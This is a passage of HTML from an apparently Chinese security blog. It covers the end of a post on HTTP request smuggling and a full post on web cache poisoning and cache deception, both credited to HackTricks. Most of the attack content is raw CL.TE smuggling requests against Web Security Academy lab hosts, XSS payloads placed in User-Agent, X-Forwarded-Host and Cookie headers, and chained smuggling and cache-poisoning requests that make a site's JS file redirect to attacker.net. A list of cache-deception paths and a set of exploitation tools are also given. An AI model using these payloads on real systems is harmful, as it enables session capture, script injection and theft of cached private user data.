class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="number">139</span></span></span><br><span class="line"><span class="language-dts">POST <span class="keyword">/post/</span>comment HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-dts"><span class="symbol">Host:</span> ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span></span><br><span class="line"><span class="language-dts">Content-Length: <span class="number">659</span></span></span><br><span class="line"><span class="language-dts">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-dts"><span class="symbol">Cookie:</span> <span class="attr">session</span><span class="operator">=</span><span class="number">4</span>X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span></span><br><span class="line"><span class="language-dts"></span></span><br><span class="line"><span class="language-dts"><span class="attr">csrf</span><span class="operator">=</span>gpGAVAbj7pKq7VfFh45CAICeFCnancCM<span class="variable">&amp;</span>postId=<span class="number">4</span><span class="variable">&amp;name</span>=HACKTRICKS<span class="variable">&amp;email</span>=email%<span class="number">40</span>email.com<span class="variable">&amp;comment</span>=</span></span><br><span class="line"><span class="language-dts"><span class="number">0</span></span></span><br><span class="line"><span class="language-dts"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>下一用户请求将成为走私请求的一部分,  用户请求信息被追加到 <code>&amp;comment=</code> 后面。由于 HTTP 参数以 <code>&amp;</code> 作为分隔符,所以追加的内容遇到 <code>&amp;</code> 之后将被终止,即只能捕获 <code>&amp;</code> 之前的数据。</p>
<h3 id="通过-HTTP-请求走私漏洞进行反射型-XSS-攻击"><a href="#通过-HTTP-请求走私漏洞进行反射型-XSS-攻击" class="headerlink" title="通过 HTTP 请求走私漏洞进行反射型 XSS 攻击"></a>通过 HTTP 请求走私漏洞进行反射型 XSS 攻击</h3><p><strong>优点:</strong></p>
<ul>
<li>勿需交互</li>
<li>能更够简单高效地触发 XSS 。例如 XSS 触发点在请求头中,真实情况下难以利用,通过 HTTP 请求走私漏洞则可快速利用。</li>
</ul>
<p><strong>CL.TE</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>213</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-makefile">0</span></span><br><span class="line"><span class="language-makefile">GET /post?postId=2 HTTP/1.1</span></span><br><span class="line"><span class="language-makefile"><span class="section">Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net</span></span></span><br><span class="line"><span class="language-makefile"><span class="section">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Length: 10</span></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Type: application/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">A=</span></span><br></pre></td></tr></table></figure>
<h3 id="将-on-site-重定向转换为开放重定向"><a href="#将-on-site-重定向转换为开放重定向" class="headerlink" title="将 on-site 重定向转换为开放重定向"></a>将 on-site 重定向转换为开放重定向</h3><p>许多应用程序存在从一个 URL 到另一个 URL 的 on-site 重定向，并将来自请求的 <code>Host</code> 头的主机名引用到重定向URL中。一个例子是 <code>Apache</code> 和 <code>IIS</code> web 服务器的默认行为，其中对一个没有结尾斜杠的文件夹的请求会收到一个重定向到包含结尾斜杠的相同文件夹:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://normal-website.com/home/</span></span><br></pre></td></tr></table></figure>

<p>这种行为通常被认为是无害的，但它可以在请求走私攻击中被利用，将其他用户重定向到外部域。例如:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="language-vbnet"><span class="keyword">GET</span> /home HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure>

<h3 id="通过-HTTP-请求走私执行-WEB-缓存中毒攻击"><a href="#通过-HTTP-请求走私执行-WEB-缓存中毒攻击" class="headerlink" title="通过 HTTP 请求走私执行 WEB 缓存中毒攻击"></a>通过 HTTP 请求走私执行 WEB 缓存中毒攻击</h3><p>如果目标站点存在缓存中毒漏洞，可以通过 HTTP 请求走私方式投毒。通过走私 <code>404</code> 请求,使用户正常请求返回 <code>404</code>，负载均衡将存储 <code>404</code> 响应页面，从而对目标页面造成拒绝服务攻击。</p>
<p>如果目标存在开放重定向，或者 on-site 重定向。我们甚至可以改变某个 js 文件的内容，如 <code>/static/include.js</code> 的内容。从而导致所有加载 <code>/static/include.js</code> 的客户端均被攻击。如下代码所示：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: attacker.net</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
<p>假设对 <code>/post/next?postId=3</code> 的访问将会触发 on-site 重定向，服务器将引用请求包中的 <code>Host</code> 头作为重定向的目标域，重定向至 <code>/post?postId=4</code>。<br>上面的走私请求 Host 被设置为有攻击者控制的服务器 <code>attacker.net</code>。在毒化 socket 后，需要发送一个正常 GET 请求访问 **<code>/static/include.js</code>**。对于 <code>/static/include.js</code> 资源的访问，服务器将返回的却是 <code>/post/next?postId=3</code> 的响应，即 302 重定向响应 <code>Location：attacker.net/post?postId=4</code> ，并且该响应将被缓存服务器缓存。只要攻击者设置对于 <code>attacker.net/post?postId=4</code> 的请求，返回恶意 js 内容，那下次有人访问 <code>/static/include.js</code>,将会返回而已资源。</p>
<h3 id="使用HTTP请求走私来执行web缓存欺骗"><a href="#使用HTTP请求走私来执行web缓存欺骗" class="headerlink" title="使用HTTP请求走私来执行web缓存欺骗"></a>使用HTTP请求走私来执行web缓存欺骗</h3><p>当目标存在缓存中毒漏洞，可尝试通过以下代码执行 web 缓存欺骗。走私一个敏感信息获取请求包，当合法用户携带认证信息访问静态文件的时候，如 ：image.png，由于 socket 被毒化，服务器将返回 <code>/private/messages</code> 的内容。但缓存服务器识别到请求的是 <code>image.png</code>，所以返回内容将被缓存至缓存服务器，攻击者可以通过请求 <code>image.png</code>，获取合法用户的个人信息。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="language-vbnet"></span></span><br><span class="line"><span class="language-vbnet"><span class="keyword">GET</span> /<span class="keyword">private</span>/messages HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure>

<h3 id="备忘清单"><a href="#备忘清单" class="headerlink" title="备忘清单"></a>备忘清单</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221225151625.png"></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/PortSwigger/http-request-smuggler">https://github.com/PortSwigger/http-request-smuggler</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/gwen001/pentest-tools/blob/master/smuggler.py">https://github.com/gwen001/pentest-tools/blob/master/smuggler.py</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/bahruzjabiyev/t-reqs-http-fuzzer">https://github.com/bahruzjabiyev/t-reqs-http-fuzzer</a>: This tool is a grammar-based HTTP Fuzzer useful to find weird request smuggling discrepancies.</li>
</ul>
<h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#weaponizing-http-request-smuggling-with-http-response-desynchronisation">https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#weaponizing-http-request-smuggling-with-http-response-desynchronisation</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">缓存中毒及缓存欺骗攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-21 23:29:08 / Modified: 23:38:33" itemprop="dateCreated datePublished" datetime="2022-11-21T23:29:08+08:00">2022-11-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/" itemprop="url" rel="index"><span itemprop="name">缓存中毒及缓存欺骗攻击</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-区别"><a href="#0x01-区别" class="headerlink" title="0x01 区别"></a>0x01 区别</h1><h2 id="缓存中毒"><a href="#缓存中毒" class="headerlink" title="缓存中毒"></a>缓存中毒</h2><ul>
<li>攻击者通过缓存中毒攻击，在应用程序中的 web 缓存中存储恶意内容，恶意内容将提供给其他应用程序用户。<h2 id="缓存欺骗"><a href="#缓存欺骗" class="headerlink" title="缓存欺骗"></a>缓存欺骗</h2></li>
<li>攻击者通过缓存欺骗攻击，将其他用户的敏感信息储存到缓存中，然后攻击者通过检索缓存内容获取其他用户的信息。</li>
</ul>
<h1 id="0x02-缓存中毒"><a href="#0x02-缓存中毒" class="headerlink" title="0x02 缓存中毒"></a>0x02 缓存中毒</h1><p>缓存中毒的目的是使客户端加载由攻击者控制的资源。执行缓存中毒攻击的前提是识别<code>非缓存键</code>（unkeyed inputs）。</p>
<ul>
<li>缓存键（keyed inputs）：指的是作为缓存服务器识别某个请求特征的请求信息，如特征匹配，则从缓存服务器返回已缓存的响应信息，通常为：<code>request-line</code> 和 <code>user-agent</code>。</li>
<li>非缓存键（unkeyed inputs）：指的是不作为缓存服务器匹配特征的其他请求信息，如 <code>Cookie: language=pl</code>;</li>
</ul>
<p>所谓识别<code>非缓存键</code>，其实是指识别不作为缓存特征却能影响响应结果的请求信息。可能是参数，可能是请求头。</p>
<h2 id="识别-web应用程序是否使用了缓存技术"><a href="#识别-web应用程序是否使用了缓存技术" class="headerlink" title="识别 web应用程序是否使用了缓存技术"></a>识别 web应用程序是否使用了缓存技术</h2><h3 id="1-检查-HTTP-标头"><a href="#1-检查-HTTP-标头" class="headerlink" title="1. 检查 HTTP 标头"></a>1. 检查 HTTP 标头</h3><p>通常，当响应信息来自缓存时，响应包会存在明确响应标头。</p>
<p><strong>服务器缓存标头</strong></p>
<ul>
<li><code>X-Cache</code>：有两个值 miss 和 hit ,分别表示命中缓存失败及命中缓存成功。</li>
<li><code>Cache-Control</code> ：指示资源是否正在被缓存以及缓存资源下一次被缓存的时间间隔：<code>Cache-Control: public, max-age=1800</code>。</li>
<li><code>Vary</code>：指示哪些请求信息被视为缓存键，即自定义缓存键。</li>
<li><code>Age</code> ：指示缓存资源在缓存服务器中的存活时间长度（以秒为单位）</li>
<li><code>Server-Timing: cdn-cache; desc=HIT</code>：缓存资源命中</li>
</ul>
<p><strong>本地缓存标头</strong></p>
<ul>
<li><code>Clear-Site-Data</code>: 指示应被删除的缓存信息 <code>Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;</code>。</li>
<li><code>Expires</code>: 指示缓存过期日期，<code>Expires: Wed, 21 Oct 2015 07:28:00 GMT</code>。</li>
<li><code>Pragma: no-cache</code> :表示不做缓存。</li>
<li><code>Warning</code>: <em><strong>未知！！！</strong></em></li>
</ul>
<h3 id="2-检查-400-响应码"><a href="#2-检查-400-响应码" class="headerlink" title="2. 检查 400 响应码"></a>2. 检查 400 响应码</h3><p>使用不符合规范的请求标头（例如：<code>\:</code>）对某个资源进行请求，迫使应用程序返回 400 错误响应码。然后正常请求该资源，若仍然返回 400 错误响应码，则证明该 web 站点受到缓存中毒影响。某些缓存服务器可能不对响应状态码进行缓存，此时，该测试无效。</p>
<h2 id="识别非缓存键"><a href="#识别非缓存键" class="headerlink" title="识别非缓存键"></a>识别非缓存键</h2><p>使用 <a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">Param Miner</a> 暴力破解可能影响响应结果的参数或者请求标头。</p>
<h2 id="触发恶意响应"><a href="#触发恶意响应" class="headerlink" title="触发恶意响应"></a>触发恶意响应</h2><p>识别非缓存键后，分析该非缓存键如何影响响应结果。触发XSS攻击或者DOS攻击。</p>
<h2 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h2><h3 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3><p>假设 x-forward-for 反映在响应结果中，通过发送 XSS 攻击 payload 毒化缓存，访问 <code>/en?region=uk</code> 的用户均被 XSS 攻击。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?region=uk</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>innocent-website.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>假设 Cookie 反映在页面上，则可以用通过 Cookie 投毒。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd&quot;%2balert(1)%2b&quot;</span><br></pre></td></tr></table></figure>
<h3 id="通过多个请求标头进行缓存中毒攻击"><a href="#通过多个请求标头进行缓存中毒攻击" class="headerlink" title="通过多个请求标头进行缓存中毒攻击"></a>通过多个请求标头进行缓存中毒攻击</h3><p>有时候需要多个非缓存键才能进行投毒缓存攻击。例如，如果某个页面存在以下情况：服务器会将所有 <code>http</code> 请求转发到 <code>https</code>，并且将 <code>x-forward-host</code> 作为目的域名。发送一个 http 请求，将 <code>x-forward-scheme</code> 设置为 <code>http</code>，服务器识别到 <code>http</code> ，触发重定向，并使用 <code>x-forward-host</code> 作为重定向的域名。所以可以通过重定向来控制页面的指向资源。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/resources/js/tracking.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acc11fe01f16f89c80556c2b0056002e.web-security-academy.net</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/</span><br><span class="line"><span class="attribute">X-Forwarded-Scheme</span><span class="punctuation">: </span>http</span><br></pre></td></tr></table></figure>

<h3 id="http-请求走私-http-缓存中毒"><a href="#http-请求走私-http-缓存中毒" class="headerlink" title="http 请求走私 + http 缓存中毒"></a>http 请求走私 + http 缓存中毒</h3><p>如果 web 站点存在 http 走私漏洞且存在缓存中毒漏洞，则可以迫使客户端在请求 <code>/static/include.js</code> 的时候，返回 <code>index.html</code> 的内容，这将导致 <code>/static/include.js</code> 无法正常被客户端访问（DOS攻击）。</p>
<ol>
<li><p>执行 http 走私攻击</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /index.html HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>受害客户端访问 <code>/static/include.js</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xGET /static/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>后端程序接收到被毒害的请求，资源 <code>/static/include.js</code> 的请求返回了 <code>/index.html</code> 的内容。且该响应资源被缓存服务器存储。至此，受害客户端对于 <code>/static/include.js</code> 的请求会被毒化，返回 <code>/index.html</code> 的内容。</p>
</li>
</ol>
<p>如果 web 站点存在重定向接口，攻击者甚至可以控制客户端加载的 js 文件内容。<br>假设网站有 URI： <code>/post/next?postId=3</code>，访问该 URI 之后，将会被重定向到 <code>/post?postId=4</code>，并且引用 <code>Host</code> 标头作为重定向的目标域。</p>
<ol>
<li><p>攻击者发送 http 走私请求，如下所示：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: attacker.net</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>受害客户端通过 <code>GET</code> 请求方式访问 <code>/static/include.js</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/post/next?postId=3</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=<span class="number">1</span>GET /static/include.js HTTP/<span class="number">1</span>.<span class="number">1</span>\r\nHost: vulnerable-website.com</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>由于存在重定向漏洞，客户端将会被重定向到 <code>attacker.net/post?postId=4</code>（302重定向包会被返回，并且储存到缓存服务器上），攻击者设置在访问恶意服务器 URL: <code>attacker.net/post?postId=4</code> 时返回恶意 JS 代码。至此，<code>/static/include.js</code> 缓存内容已被毒化成功，访问 <code>/static/include.js</code> 的响应内容均会被替换成攻击者控制的恶意 JS 内容。</p>
</li>
</ol>
<h2 id="Web缓存中毒自动化测试工具"><a href="#Web缓存中毒自动化测试工具" class="headerlink" title="Web缓存中毒自动化测试工具"></a>Web缓存中毒自动化测试工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner">Web缓存中毒漏洞扫描程序</a>，用法示例：<code>wcvs -u example.com</code></p>
<h1 id="0x03-缓存欺骗"><a href="#0x03-缓存欺骗" class="headerlink" title="0x03 缓存欺骗"></a>0x03 缓存欺骗</h1><p>静态文件(如： <code>.js</code>,<code>.css</code>,<code>.png</code> 等等)通常被配置为保存到缓存服务器中。例如，访问 <code>www.example.com/profile.php/nonexistent.js</code> 的时候，由于某些缓存服务器仅识别访问文件后缀便将响应结果储存在缓存服务器中。但是后端应用程序对于该链接，响应的结果却是：<code>www.example.com/profile.php</code>,其中该响应结果包含用户的一些敏感信息。上述问题将会导致缓存服务器错误地缓存了包含用户敏感信息的响应结果。攻击者可以通过钓鱼，xss，csrf的方式诱使受害者访问 <code>www.example.com/profile.php/nonexistent.js</code> ，从而进行缓存欺骗攻击，窃取用户敏感信息。</p>
<p>可能有用的测试形式</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/.js">www.example.com/profile.php/.js</a></li>
<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/.css">www.example.com/profile.php/.css</a></li>
<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/test.js">www.example.com/profile.php/test.js</a></li>
<li><a target="_blank" rel="noopener" href="http://www.example.com/test.js">www.example.com/profile.php/../test.js</a></li>
<li><a target="_blank" rel="noopener" href="http://www.example.com/test.js">www.example.com/profile.php/%2e%2e/test.js</a></li>
<li>Use less known extensions such as .avif</li>
</ul>
<blockquote>
<p>缓存欺骗真实的个案：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/593712">https://hackerone.com/reports/593712</a></p>
</blockquote>
<h1 id="From"><a href="#From" class="headerlink" title="From"></a>From</h1><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/cache-deception">https://book.hacktricks.xyz/pentesting-web/cache-deception</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
